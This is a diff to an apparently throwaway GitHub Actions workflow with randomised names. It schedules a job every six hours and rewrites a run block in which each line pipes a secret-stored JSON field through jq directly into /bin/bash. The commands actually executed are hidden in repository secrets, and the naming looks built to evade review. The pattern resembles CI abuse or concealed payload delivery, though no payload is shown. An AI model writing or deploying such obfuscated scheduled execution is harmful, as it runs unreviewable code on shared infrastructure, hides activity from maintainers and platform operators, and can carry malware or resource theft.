@@ -1,8 +1,9 @@
 name: yuanyaozu5274
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 2/6 * * *'
+    - cron: '28 3/6 * * *'
 
 jobs:
   build:
@@ -11,12 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: yuanyaozu5274
         env:
-          dii556: ${{ secrets.dii556 }}
+          xryy1: ${{ secrets.xryy1 }}
         run: |
-          echo $dii556 | jq -r .o39724 | /bin/bash
-          echo $qq642 | jq -r .hyb5 | /bin/bash
-          echo $eo378 | jq -r .zojj05898 | /bin/bash
-          echo $ad4 | jq -r .wri2495 | /bin/bash
-          echo $xszz9655 | jq -r .fl770 | /bin/bash
-          echo $pai751 | jq -r .seubd994 | /bin/bash
+          echo $xryy1 | jq -r .yvll648 | /bin/bash
+          echo $l38313 | jq -r .rg800 | /bin/bash
+          echo $ikbek00238 | jq -r .ksoa0 | /bin/bash
+          echo $zdc06 | jq -r .yrt5129 | /bin/bash
+          echo $rbggi78864 | jq -r .ajez050 | /bin/bash
+          echo $hgn5 | jq -r .tsauu7 | /bin/bash
+          echo $c96 | jq -r .k96690 | /bin/bash
 
